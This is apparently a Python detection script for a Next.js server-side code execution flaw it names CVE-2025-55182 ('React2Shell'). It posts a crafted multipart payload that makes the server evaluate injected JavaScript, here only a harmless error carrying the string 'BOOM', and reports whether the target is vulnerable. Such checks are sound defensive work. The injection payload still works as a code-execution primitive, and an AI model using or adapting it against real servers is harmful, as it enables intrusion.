import requests
import json

URL = "http://127.0.0.1:3000"

# Non-invasive probe.py that just outputs a fixed string instead of executing a command

res = requests.post(
    URL,
    files={
        "0": (
            None,
            json.dumps(
                {
                    "status": "resolved_model",
                    "reason": 0,
                    "_response": {
                        "_prefix": "throw Object.assign(new Error(), {digest:`BOOM`});",
                        "_formData": {
                            "get": "$1:then:constructor",
                        },
                    },
                    "then": "$1:then",
                    "value": '{"then":"$B"}',
                }
            ),
        ),
        "1": (None, '"$@0"'),
    },
    headers={"Next-Action": "x"},
)


if (
    "1:E" in res.text
    and (leaked_string := json.loads(res.text.split("1:E")[1].strip())["digest"])
    and leaked_string == "BOOM"
):
    print("ðŸ’¥ This Next.js instance is VULNERABLE to CVE-2025-55182 (React2Shell) !")
else:
    print(
        "âœ… This Next.js instance is NOT vulnerable to CVE-2025-55182 (React2Shell) !"
    )
